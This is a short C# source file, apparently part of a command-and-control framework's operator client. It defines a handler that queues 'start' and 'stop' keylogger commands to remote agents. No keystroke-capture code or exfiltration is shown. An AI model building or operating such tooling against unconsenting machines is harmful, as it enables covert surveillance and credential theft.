using Trinity.Shared.Errors;
using Trinity.Shared.Interfaces;
using Trinity.Shared.Results;

namespace Client.Interpreter.Strategies;

public class KeyloggerStrategy : ICommandStrategy
{
    public readonly string Keyword = "keylogger";
    private readonly ICommandAPI _client;

    public KeyloggerStrategy(ICommandAPI client)
    {
        _client = client;
    }

    public async Task<Result<string>> ProcessCommandAsync(int agentID, string? command)
    {
        var sub = command?.Trim().ToLowerInvariant();

        if (sub == "start")
        {
            var task = await _client.QueueStartKeyloggerCommandAsync(agentID);
            return $"Tasked agent to start keylogger #{task}";
        }

        if (sub == "stop")
        {
            var task = await _client.QueueStopKeyloggerCommandAsync(agentID);
            return $"Tasked agent to stop keylogger #{task}";
        }

        return CommandError.TooFewArgs(Keyword);
    }
}
